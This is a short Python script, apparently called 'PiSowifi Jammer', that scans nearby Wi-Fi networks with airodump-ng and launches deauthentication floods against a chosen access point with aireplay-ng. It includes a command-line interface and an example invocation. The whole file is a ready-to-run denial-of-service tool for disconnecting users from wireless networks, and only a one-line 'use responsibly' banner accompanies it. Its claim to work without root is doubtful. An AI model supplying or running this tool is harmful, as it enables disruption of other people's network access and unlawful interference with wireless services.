#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# PiSowifi Jammer (Non-Rooted Termux Wi-Fi Deauther)

import subprocess
import time
import random
import argparse

def scan_networks(interface="wlan0"):
    print("🔍 Scanning for nearby Wi-Fi networks...")
    try:
        subprocess.run(["timeout", "10", "airodump-ng", interface], check=True)
    except subprocess.CalledProcessError as e:
        print(f"❌ Error scanning networks: {e}")
        print("💡 Make sure 'airodump-ng' is installed and your interface is correct.")

def deauth_attack(bssid, interface="wlan0", count=100):
    print(f"🚀 Launching deauth attack on {bssid}...")
    try:
        cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid, interface]
        subprocess.run(cmd, check=True)
        print("✅ Attack complete!")
    except subprocess.CalledProcessError as e:
        print(f"❌ Error during attack: {e}")
        print("💡 Make sure your Wi-Fi adapter supports monitor mode.")

def main():
    parser = argparse.ArgumentParser(description="PiSowifi Jammer (Non-Rooted Wi-Fi Deauther)")
    parser.add_argument("-s", "--scan", action="store_true", help="Scan for nearby Wi-Fi networks")
    parser.add_argument("-a", "--attack", help="Launch deauth attack on a specific BSSID")
    parser.add_argument("-i", "--interface", default="wlan0", help="Wi-Fi interface (default: wlan0)")
    parser.add_argument("-c", "--count", type=int, default=100, help="Number of deauth packets (default: 100)")
    args = parser.parse_args()

    print("📡 PiSowifi Jammer (Non-Rooted Termux)")
    print("⚠️ Use responsibly! Only test on your own network.\n")

    if args.scan:
        scan_networks(args.interface)
    elif args.attack:
        deauth_attack(args.attack, args.interface, args.count)
    else:
        print("📌 Usage:")
        print("  -s, --scan       Scan for nearby Wi-Fi networks")
        print("  -a, --attack     Launch deauth attack on a BSSID")
        print("  -i, --interface  Wi-Fi interface (default: wlan0)")
        print("  -c, --count      Number of deauth packets (default: 100)")
        print("\nExample:")
        print("  python3 wifi_jammer.py -s")
        print("  python3 wifi_jammer.py -a 00:11:22:33:44:55 -c 200")

if __name__ == "__main__":
    main()
